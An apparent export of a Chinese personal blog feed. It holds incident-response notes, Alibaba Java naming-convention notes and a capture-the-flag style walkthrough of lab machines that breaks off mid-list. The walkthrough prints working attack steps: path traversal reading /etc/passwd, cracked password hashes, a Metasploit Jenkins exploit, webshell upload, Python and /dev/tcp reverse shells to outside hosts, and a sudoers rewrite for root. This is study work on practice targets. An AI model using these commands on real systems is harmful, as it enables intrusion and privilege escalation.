<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-&gt;|eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  </span><br><span class="line">          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f85/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1599085 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2032868 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:476430398 (454.3 MiB)  TX bytes:1041839269 (993.5 MiB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:8F  </span><br><span class="line">          inet addr:10.3.3.100  Bcast:10.3.3.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:fecb:9f8f/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1174416 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:1032202 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:832835972 (794.2 MiB)  TX bytes:102428452 (97.6 MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:2066 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:2066 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:215082 (210.0 KiB)  TX bytes:215082 (210.0 KiB)</span><br></pre></td></tr></table></figure>

<p>10、黑客使用了什么账号登陆了mail系统:</p>
<p>admin&#x2F;admin!@#pass123</p>
<p>11、黑客获得的vpn,ip是多少：</p>
<p>vpn中扫描其他ip最多的就是黑客的内网ip</p>
<p>10.3.4.3</p>
<h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><p><a href="https://www.freebuf.com/articles/terminal/192859.html">https://www.freebuf.com/articles/terminal/192859.html</a></p>
<p><a href="https://www.freebuf.com/articles/system/218407.html">https://www.freebuf.com/articles/system/218407.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/436617932">https://zhuanlan.zhihu.com/p/436617932</a></p>
<p><a href="https://www.cnblogs.com/fox-yu/p/14380849.html">https://www.cnblogs.com/fox-yu/p/14380849.html</a></p>
<p><a href="https://www.cnblogs.com/v1vvwv/p/Windows-Emergency-Response.html">https://www.cnblogs.com/v1vvwv/p/Windows-Emergency-Response.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1800490?shareByChannel=link#2.9">https://cloud.tencent.com/developer/article/1800490?shareByChannel=link#2.9</a></p>
<h3 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h3><h4 id="3W1H"><a href="#3W1H" class="headerlink" title="3W1H"></a><strong>3W1H</strong></h4><p>who: 攻击者IP，受害主机是那些，是在那个安全设备上出现的告警</p>
<p>what：发生了什么攻击行为，是漏扫探测，还是已经打进来了？产品版本是多少？其他未失陷主机有没有这样的漏洞？</p>
<p>why：是因为开放了不安全端口？还是已有漏洞未修补？为什么前期没有排查出来？还是因为被钓鱼？</p>
<p>how：具体是怎么攻击的？是不是在野0day？怎么抑制？怎么修补？</p>
<h4 id="易失性原则"><a href="#易失性原则" class="headerlink" title="易失性原则"></a><strong>易失性原则</strong></h4><p>时效性</p>
<p>有一定的先后顺序，即最容易丢失的数据，应该最先收集，其它的依次类推。</p>
<h4 id="要素原则"><a href="#要素原则" class="headerlink" title="要素原则"></a><strong>要素原则</strong></h4><p>主要是抓关键证据，即要素，这些要素包括样本、流量、日志、进程及模块、内存、启动项。</p>
<h4 id="避害原则"><a href="#避害原则" class="headerlink" title="避害原则"></a><strong>避害原则</strong></h4><p>趋利避害，不能问题还没有解决，反而引入了新的问题。</p>
<p>失陷主机下线或隔离</p>
<p>使用来源不明被感染的工具</p>
<p>钓鱼样本或勒索样本不加密不压缩发送</p>
<h3 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a><strong>应急响应流程</strong></h3><p>判断是否是真实攻击，是否是误报</p>
<p>收集信息：收集客户信息和中毒主机信息，包括样本。</p>
<p>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、等等。</p>
<p>深入分析：日志分析、进程分析、启动项分析、样本分析。</p>
<p>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件。</p>
<p>产出报告：整理并输出完整的安全事件报告。</p>
]]></content>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式</title>
    <url>/2024/07/15/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>java</tag>
        <tag>架构</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里代码规范学习</title>
    <url>/2024/06/28/%E9%98%BF%E9%87%8C%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>在线阅读链接：<a href="https://developer.aliyun.com/ebook/386/read?spm=a2c6h.26392459.ebook-detail.4.63392867ZDnuXr">https://developer.aliyun.com/ebook/386/read?spm=a2c6h.26392459.ebook-detail.4.63392867ZDnuXr</a></p>
<span id="more"></span>

<h2 id="编码规范"><a href="#编码规范" class="headerlink" title="编码规范"></a>编码规范</h2><h3 id="命名风格"><a href="#命名风格" class="headerlink" title="命名风格"></a>命名风格</h3><p>记住即可，有特殊需要备注的在这里写出来</p>
<p><a href="https://blog.csdn.net/Dontla/article/details/124428174">小驼峰命名法（lower camel case）和大驼峰命名法（upper camel case）_小驼峰法和大驼峰法-CSDN博客</a></p>
<p>总结：</p>
<p>类名：UpperCamelCase </p>
<p>方法名、参数名、成员变量、局部变量：lowerCamelCase</p>
<p>常量命名：全部大写、单词间用下划线隔开</p>
<h4 id="【强制】POJO-类中布尔类型的变量，都不要加-is，否则部分框架解析会引起序列化错误。"><a href="#【强制】POJO-类中布尔类型的变量，都不要加-is，否则部分框架解析会引起序列化错误。" class="headerlink" title="【强制】POJO 类中布尔类型的变量，都不要加 is，否则部分框架解析会引起序列化错误。"></a>【强制】POJO 类中布尔类型的变量，都不要加 is，否则部分框架解析会引起序列化错误。</h4><p>参考链接：</p>
<p><a href="https://blog.csdn.net/weixin_41800884/article/details/103870601">POJO类中布尔类型的变量都不要加is前缀详解_pojo类中的任何布尔类型的变量,都不要加is前缀-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/badaoliumangqizhi/p/17459980.html">霸道的程序猿的博客 (cnblogs.com)</a></p>
<p>复现：</p>
<p>下面是一种情况：</p>
<p>user类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVip</span><span class="params">(Boolean vip)</span> &#123;</span><br><span class="line">        isVip = vip;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Boolean isVip;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">getVip</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isVip;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">isPrefixBooleanPropertyTest</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(user); <span class="comment">// 序列化对象</span></span><br><span class="line">    System.out.println(jsonString); <span class="comment">// 输出 JSON 字符串</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;isVip&quot;:true,&quot;vip&quot;:true&#125;</span><br><span class="line">User(isVip=true)</span><br></pre></td></tr></table></figure>

<p>可以看到莫名奇妙多了一个变量，断点分析一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">断点：String jsonString = JSON.toJSONString(user);   //user.toString() = User(isVip=true)</span><br><span class="line">进入断点到</span><br></pre></td></tr></table></figure>





<p>测试2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">isPrefixBooleanPropertyTest</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;\&quot;Vip\&quot;:true&#125;&quot;</span>, User.class); <span class="comment">// 反序列化 JSON 字符串</span></span><br><span class="line">    System.out.println(user1.toString()); <span class="comment">// 输出反序列化后的对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User(isVip=true)</span><br></pre></td></tr></table></figure>

<p>测试3</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">isPrefixBooleanPropertyTest</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;&#123;\&quot;isVip\&quot;:true&#125;&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;\&quot;isVip\&quot;:true&#125;&quot;</span>, User.class); <span class="comment">// 反序列化 JSON 字符串</span></span><br><span class="line">    System.out.println(user1.toString()); <span class="comment">// 输出反序列化后的对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;isVip&quot;:true&#125;</span><br><span class="line">User(isVip=true)</span><br></pre></td></tr></table></figure>

<p>即有奇奇怪怪的问题。</p>
<p>todo：之后源码分析</p>
<h4 id="【推荐】如果模块、接口、类、方法使用了设计模式，在命名时体现出具体模式"><a href="#【推荐】如果模块、接口、类、方法使用了设计模式，在命名时体现出具体模式" class="headerlink" title="【推荐】如果模块、接口、类、方法使用了设计模式，在命名时体现出具体模式"></a>【推荐】如果模块、接口、类、方法使用了设计模式，在命名时体现出具体模式</h4><p>说明：将设计模式体现在名字中，有利于阅读者快速理解架构设计理念。</p>
<h4 id="接口类中的方法和属性不要加任何修饰符号（public-也不要加），保持代码的简洁-性，并加上有效的-Javadoc-注释。尽量不要在接口里定义变量，如果一定要定义变量，肯定是-与接口方法相关，并且是整个应用的基础常量。"><a href="#接口类中的方法和属性不要加任何修饰符号（public-也不要加），保持代码的简洁-性，并加上有效的-Javadoc-注释。尽量不要在接口里定义变量，如果一定要定义变量，肯定是-与接口方法相关，并且是整个应用的基础常量。" class="headerlink" title="接口类中的方法和属性不要加任何修饰符号（public 也不要加），保持代码的简洁 性，并加上有效的 Javadoc 注释。尽量不要在接口里定义变量，如果一定要定义变量，肯定是 与接口方法相关，并且是整个应用的基础常量。"></a>接口类中的方法和属性不要加任何修饰符号（public 也不要加），保持代码的简洁 性，并加上有效的 Javadoc 注释。尽量不要在接口里定义变量，如果一定要定义变量，肯定是 与接口方法相关，并且是整个应用的基础常量。</h4><p>参考链接：<a href="https://blog.csdn.net/qq_44543508/article/details/102609910">java抽象类（abstract）与接口（Interface）的区别_javaabstract 和interface区别-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_19782019/article/details/80259836">JAVA基础——接口（全网最详细教程）_java接口怎么写-CSDN博客</a></p>
<h2 id="常量定义"><a href="#常量定义" class="headerlink" title="常量定义"></a>常量定义</h2><h3 id="【强制】不允许任何魔法值（即未经定义的常量）直接出现在代码中"><a href="#【强制】不允许任何魔法值（即未经定义的常量）直接出现在代码中" class="headerlink" title="【强制】不允许任何魔法值（即未经定义的常量）直接出现在代码中"></a>【强制】不允许任何魔法值（即未经定义的常量）直接出现在代码中</h3><p>参考：[不要再使用魔法值了！_【推荐】不允许任何魔法值(即未经预先定义的常量)直接出现在代码中。 反例: &#96;&#96;&#96; s-CSDN博客](<a href="https://blog.csdn.net/qq_41267618/article/details/103029427">https://blog.csdn.net/qq_41267618/article/details/103029427</a>)</p>
<p>也就是什么常量，最好用一个变量表达他的意思，不然会给其他阅读者带来阅读障碍。</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>八股文</title>
    <url>/2023/04/04/%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a076620858741f355f5ed8316951e96bad9961a4ec26fd9a1262d8d0e94b49b9"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>记录</tag>
        <tag>资源整理</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机玩耍</title>
    <url>/2023/03/16/%E9%9D%B6%E6%9C%BA%E7%8E%A9%E8%80%8D/</url>
    <content><![CDATA[<span id="more"></span>



<h2 id="W1R3S"><a href="#W1R3S" class="headerlink" title="W1R3S"></a>W1R3S</h2><p>获得靶机IP（记得kali、靶机网络都改桥接）得到ip 192.168.1.28</p>
<h3 id="nmap-扫服务"><a href="#nmap-扫服务" class="headerlink" title="nmap 扫服务"></a>nmap 扫服务</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092242512.png" alt="image-20230316092242512"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap --min-rate 10000  -p-  192.168.1.28      （全面的扫描端口）</span><br><span class="line">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.1.28 （扫描对应端口获取详细信息）（TCP扫描）</span><br><span class="line">    PORT     STATE SERVICE VERSION</span><br><span class="line">    21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">    3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">    10123/tcp open  unknown</span><br><span class="line">    MAC Address: 00:0C:29:A0:15:2E (VMware)</span><br><span class="line">    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">    Device type: general purpose</span><br><span class="line">    Running: Linux 3.X|4.X|5.X</span><br><span class="line">    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1</span><br><span class="line">    OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9, Linux 5.1</span><br><span class="line">    Network Distance: 1 hop</span><br><span class="line">    Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">    Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds</span><br><span class="line">sudo nmap -sU -p21,22,80,3306 192.168.1.28 （udp扫描）//记住还可以扫IPV6</span><br><span class="line">sudo nmap --script=vuln -p21,22,80,3306 192.168.1.28  //（扫描插件漏洞） </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="访问ftp"><a href="#访问ftp" class="headerlink" title="访问ftp"></a>访问ftp</h3><p>匿名 （获得对应文件）（命令行访问记得输入binary命令，防止破坏可执行文件）</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316092603021.png" alt="image-20230316092603021"></p>
<h3 id="访问web"><a href="#访问web" class="headerlink" title="访问web"></a>访问web</h3><h4 id="目录爆破：dirb、gobuster、feroxbuster"><a href="#目录爆破：dirb、gobuster、feroxbuster" class="headerlink" title="目录爆破：dirb、gobuster、feroxbuster"></a>目录爆破：dirb、gobuster、feroxbuster</h4><p>使用dirb爆破找到<a href="http://192.168.1.28/administrator/installation/">http://192.168.1.28/administrator/installation/</a></p>
<p>数据库创建失败</p>
<p>开始看cms（cuppa）有漏洞没有</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa</span><br><span class="line">searchsploit  cuppa cms -m 25791  </span><br><span class="line">cat 25971.txt</span><br></pre></td></tr></table></figure>

<p>访问<a href="http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd%E5%A4%B1%E8%B4%A5">http://192.168.1.28/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd失败</a></p>
<p><a href="http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.1.28/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 失败</p>
<p><a href="http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.1.28/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a> 成功显示（但没有东西）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl    --data-urlencode urlConfig=../../../../../../../../../etc/passwd  http://192.168.1.28/administrator/alerts/alertConfigField.php  （需要post）</span><br></pre></td></tr></table></figure>

<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>sudo 提权</p>
<p>可以ftp提权，也可以sudo &#x2F;bin&#x2F;bash，也可也sudo time &#x2F;root&#x2F;flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316093047508.png" alt="image-20230316093047508"></p>
<p>成功</p>
<h2 id="jarbas"><a href="#jarbas" class="headerlink" title="jarbas"></a>jarbas</h2><ul>
<li><p>先nmap扫描</p>
<ul>
<li><p>得到靶机IP 192.168.1.30<img src="https://api2.mubu.com/v3/document_image/e874e4e1-6981-469c-9d66-09d0b8a0c953-18494357.jpg" alt="img"></p>
</li>
<li><p>全面的扫：sudo nmap –min-rate 10000  -p-  192.168.1.30<img src="https://api2.mubu.com/v3/document_image/24460aa6-3cc1-49bc-b10b-ca3e1d063731-18494357.jpg" alt="img"></p>
</li>
<li><p>sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.1.30 （TCP）<img src="https://api2.mubu.com/v3/document_image/271e47c1-d865-4c73-bed1-174f348dc01f-18494357.jpg" alt="img"></p>
</li>
<li><p>sudo nmap -sU -sV -O -p22,80,3306,8080 192.168.1.30 （UDP）<img src="https://api2.mubu.com/v3/document_image/e1f93768-df56-4fd4-8ba9-baf8e8ad45e7-18494357.jpg" alt="img"></p>
</li>
<li><p>扫描漏洞：sudo nmap –script&#x3D;vuln -p22,80,3306,8080 192.168.1.30<img src="https://api2.mubu.com/v3/document_image/ebe9376e-7eec-40ff-bf55-af408cf9a039-18494357.jpg" alt="img"></p>
</li>
</ul>
</li>
<li><p>80端口web服务</p>
<ul>
<li><p>dirb 扫描dirb <a href="http://192.168.1.30/">http://192.168.1.30:80</a>   -X .html -o output.txt  (可以多试下看加不加.html)<img src="https://api2.mubu.com/v3/document_image/1b8ee47f-7a60-4979-b382-f8dd852407b9-18494357.jpg" alt="img"></p>
</li>
<li><p>访问access<img src="https://api2.mubu.com/v3/document_image/fac7740e-0279-49e8-9c15-63af5e4734a9-18494357.jpg" alt="img"></p>
</li>
<li><p>hash解密</p>
<ul>
<li><p>看类型（md5）<img src="https://api2.mubu.com/v3/document_image/4635c79e-b18f-4768-be95-8402052db235-18494357.jpg" alt="img"></p>
</li>
<li><p>解密</p>
<ul>
<li><p>tiago:5978a63b4654c73c60fa24f836386d87：italia99</p>
</li>
<li><p>trindade:f463f63616cb3f1e81ce46b39f882fd5：marianna</p>
</li>
<li><p>eder:9b38e2b1e8b12f426b0d208a7ab6cb98：vipsu</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>8080端口处理</p>
<ul>
<li><p>使用之前三组密码登录，最后一组可以<img src="https://api2.mubu.com/v3/document_image/939d0297-acfe-42a1-9a21-61839f2adf3f-18494357.jpg" alt="img"></p>
</li>
<li><p>jenkins尝试使用msf攻击<img src="https://api2.mubu.com/v3/document_image/b0650d15-a14f-410d-8e88-5e444e4ffcbf-18494357.jpg" alt="img"></p>
</li>
<li><p>use exploit&#x2F;multi&#x2F;http&#x2F;jenkins_script_console</p>
</li>
<li><p>show options（注意lport不要设成4444）<img src="https://api2.mubu.com/v3/document_image/cf0e5e49-a74e-4ab7-b332-523dd9eebafb-18494357.jpg" alt="img"></p>
</li>
<li><p>成功得到shell<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/38f69a88-a519-432d-a4be-458890219659-18494357.jpg" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h2 id="sickos2"><a href="#sickos2" class="headerlink" title="sickos2"></a>sickos2</h2><ul>
<li><p>目标探测</p>
<ul>
<li><p>──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ sudo nmap  -sV -sT -O  -p22,80 192.168.0.105</p>
</li>
<li><p>Starting Nmap 7.93 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2023-02-06 22:49 EST</p>
</li>
<li><p>Nmap scan report for 192.168.0.105</p>
</li>
<li><p>Host is up (0.00025s latency).</p>
</li>
<li><p>PORT   STATE SERVICE VERSION</p>
</li>
<li><p>22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</p>
</li>
<li><p>80&#x2F;tcp open  http    lighttpd 1.4.28</p>
</li>
<li><p>MAC Address: 00:0C:29:9D:7F:28 (VMware)</p>
</li>
<li><p>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</p>
</li>
<li><p>Device type: general purpose</p>
</li>
<li><p>Running: Linux 3.X|4.X</p>
</li>
<li><p>OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</p>
</li>
<li><p>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</p>
</li>
<li><p>Network Distance: 1 hop</p>
</li>
<li><p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
</li>
<li><p>OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p>
</li>
</ul>
</li>
<li><p>nikto</p>
<ul>
<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ nikto -url 192.168.0.105                                                                                                                                                                                                                                                    1 ⨯</p>
</li>
<li><p>- Nikto v2.1.6</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Target IP:          192.168.0.105</p>
</li>
<li><p>+ Target Hostname:    192.168.0.105</p>
</li>
<li><p>+ Target Port:        80</p>
</li>
<li><p>+ Start Time:         2023-02-07 01:51:25 (GMT-5)</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Server: lighttpd&#x2F;1.4.28</p>
</li>
<li><p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
</li>
<li><p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
</li>
<li><p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
</li>
<li><p>+ All CGI directories ‘found’, use ‘-C none’ to test none</p>
</li>
<li><p>+ Retrieved x-powered-by header: PHP&#x2F;5.3.10-1ubuntu3.21</p>
</li>
<li><p>+ 26545 requests: 0 error(s) and 4 item(s) reported on remote host</p>
</li>
<li><p>+ End Time:           2023-02-07 01:52:28 (GMT-5) (63 seconds)</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ 1 host(s) tested</p>
</li>
</ul>
</li>
<li><p>dirb 扫描到  <a href="http://192.168.0.105/test/">http://192.168.0.105/test/</a> </p>
</li>
<li><p>whatweb</p>
<ul>
<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ whatweb 192.168.0.105                                                                                                                                                                                                                                                     130 ⨯</p>
</li>
<li><p><a href="http://192.168.0.105/">http://192.168.0.105</a> [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd&#x2F;1.4.28], IP[192.168.0.105], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP&#x2F;5.3.10-1ubuntu3.21], lighttpd[1.4.28]</p>
</li>
</ul>
</li>
<li><p>nmap –script-help http-methods     </p>
</li>
<li><p>nmap –script http-methods –script-args http-methods.url-path&#x3D;’&#x2F;test’ 192.168.0.105</p>
</li>
<li><p>向对应目录PUT发现确实可以写文件</p>
<ul>
<li>例子<img src="https://api2.mubu.com/v3/document_image/70a922dc-e820-4b23-aa5d-a8afe464b7fc-18494357.jpg" alt="img"></li>
</ul>
</li>
<li><p>反弹shell</p>
<ul>
<li><p>php一句话，然后使用蚁剑连接<img src="https://api2.mubu.com/v3/document_image/d7f49224-c148-450b-8460-74cf27d38a0e-18494357.jpg" alt="img"></p>
</li>
<li><p>使用hackbar 得python reverse_shell 反弹</p>
<ul>
<li><p>python -c ‘import os,pty,socket;s&#x3D;socket.socket();s.connect((“192.168.0.107”,443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(“sh”)’</p>
</li>
<li><p>切换到交互式python  python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’<img src="https://api2.mubu.com/v3/document_image/36c1ba1c-191f-4957-be77-ac546591cb3e-18494357.jpg" alt="img"></p>
</li>
<li><p>另外：</p>
<ul>
<li><p>curl上传文件</p>
<ul>
<li><p>curl -v -T php-reverse-shell.php “<a href="http://192.168.30.208/test/">http://192.168.30.208/test/</a>“</p>
</li>
<li><h2 id="v-–verbose-输出详细内容"><a href="#v-–verbose-输出详细内容" class="headerlink" title="#-v, –verbose                  输出详细内容"></a>#-v, –verbose                  输出详细内容</h2><p>  -<br>- #-T, –upload-file FILE			后跟上传目标文件（Transfer）</p>
</li>
<li><p>#-H, –header      LINE         添加请求头, 可添加多个 -H 参数</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>提权</p>
<ul>
<li><p>whoami;pwd;uname -a</p>
</li>
<li><p>lsb_release -a</p>
<ul>
<li><p>www-data@ubuntu:&#x2F;tmp$ lsb_release -a</p>
</li>
<li><p>lsb_release -a</p>
</li>
<li><p>No LSB modules are available.</p>
</li>
<li><p>Distributor ID: Ubuntu</p>
</li>
<li><p>Description:    Ubuntu 12.04.4 LTS</p>
</li>
<li><p>Release:        12.04</p>
</li>
<li><p>Codename:       precise</p>
</li>
</ul>
</li>
<li><p>seachexploit 没找到</p>
</li>
<li><p>看定时任务</p>
</li>
<li><p>ls -la &#x2F;etc&#x2F;cron*</p>
</li>
<li><p>printf ‘#!&#x2F;bin&#x2F;bash\nbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.137.150&#x2F;8080 0&gt;&amp;1\n’ &gt; &#x2F;tmp&#x2F;update</p>
</li>
<li><p>echo ‘chmod +w &#x2F;etc&#x2F;sudoers &amp;&amp; echo “www-data ALL&#x3D;(ALL)  NOPASSWD:ALL” &gt; &#x2F;etc&#x2F;sudoers’ &gt; &#x2F;tmp&#x2F;update<img src="https://api2.mubu.com/v3/document_image/5c80ac6e-ef16-4183-8724-bdbfe4eb023c-18494357.jpg" alt="img"></p>
</li>
<li><p>sudo &#x2F;bin&#x2F;bash</p>
</li>
<li><p>get</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="prime-1"><a href="#prime-1" class="headerlink" title="prime 1"></a>prime 1</h2><ul>
<li><p>自己慢慢测试</p>
<ul>
<li><p>得到靶机IP 192.168.0.109</p>
</li>
<li><p>nmap 扫描（TCP、UDP、–min-rate、–script）得到22、80开的</p>
</li>
<li><p>nikto访问web目录没找到明显漏洞</p>
</li>
<li><p>dirb 扫描一下web</p>
<ul>
